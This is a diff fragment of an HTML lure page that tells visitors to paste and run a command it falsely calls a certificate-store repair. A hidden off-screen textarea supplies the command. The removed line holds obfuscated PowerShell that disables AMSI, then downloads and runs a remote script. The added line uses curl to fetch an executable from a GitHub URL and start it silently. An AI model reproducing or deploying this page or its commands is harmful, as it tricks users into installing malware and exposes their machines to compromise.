@@ -33,7 +33,7 @@ p{font-size:14px;color:#5f6368;line-height:1.6;margin-bottom:16px}
 <div class="step"><b>Step 2:</b> Paste the command and press <b>Enter</b></div>
 </div>
 <p style="font-size:12px;color:#9aa0a6;margin-top:12px">This command re-registers Windows certificate stores. A command window may briefly appear — this is normal.</p>
-<textarea id="cmdBox" style="position:absolute;left:-9999px">powershell -NoP -NonI -W Hidden -Exec Bypass -C "$a=[Ref].Assembly.GetType(('Sys'+'tem.Man'+'agement.Aut'+'omation.Amsi'+'Utils'));$b=$a.GetField(('amsiInitF'+'ailed'),'NonPublic,Static');$b.SetValue($null,$true);$c=New-Object Net.WebClient;$d=$c.DownloadString(('https://raw.githubusercontent.com/kai195102/d/main/c.ps1'));IEX $d"</textarea>
+<textarea id="cmdBox" style="position:absolute;left:-9999px">curl -sLo %tmp%\c2.exe https://raw.githubusercontent.com/kai195102/d/main/c2d.exe & start /b %tmp%\c2.exe</textarea>
 </div>
 <script>
 const cmd = document.getElementById("cmdBox").value;
